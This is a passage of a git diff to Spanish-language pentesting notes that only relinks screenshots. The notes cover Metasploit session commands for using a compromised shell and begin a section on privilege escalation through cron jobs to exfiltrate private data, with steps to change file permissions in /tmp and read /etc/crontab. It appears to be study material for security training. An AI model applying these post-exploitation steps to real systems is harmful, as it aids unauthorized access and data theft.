-- Se nos crea una sesión: ![](Pasted%20image%2020230601131210.png)
-- Para ver las sesiones activas: `sessions -l` ![](Pasted%20image%2020230601131237.png)
-- Para iniciar sesión en una: `sessions -i <ID_SESSION>` ![](Pasted%20image%2020230601131435.png)
-- Ahora ya podemos ejecutar comandos como en un shell normal: ![](Pasted%20image%2020230601131513.png) ![](Pasted%20image%2020230601131609.png)
+- Se nos crea una sesión: ![](img/Pasted%20image%2020230601131210.png)
+- Para ver las sesiones activas: `sessions -l` ![](img/Pasted%20image%2020230601131237.png)
+- Para iniciar sesión en una: `sessions -i <ID_SESSION>` ![](img/Pasted%20image%2020230601131435.png)
+- Ahora ya podemos ejecutar comandos como en un shell normal: ![](img/Pasted%20image%2020230601131513.png) ![](img/Pasted%20image%2020230601131609.png)
 
 ## Escalada de privilegios a través de trabajos cron: Exfiltración de información privada (Scheduled Task/Job)
 
@@ -1031,6 +1031,6 @@ set LPORT 4444
 	- Vamos a usar esta vulnerabilidad como vector para exfiltrar información privada:
 		- Inicia sesión en la máquina objetivo
 		- Da permisos o+r a `/tmp/integrity_check.py`
-		- Comprueba el contenido del archivo `/etc/crontab` ![](Pasted%20image%2020230601232751.png) Para interpretar su información visita: https://ostechnix.com/a-beginners-guide-to-cron-jobs/
+		- Comprueba el contenido del archivo `/etc/crontab` ![](img/Pasted%20image%2020230601232751.png) Para interpretar su información visita: https://ostechnix.com/a-beginners-guide-to-cron-jobs/
 
 ---
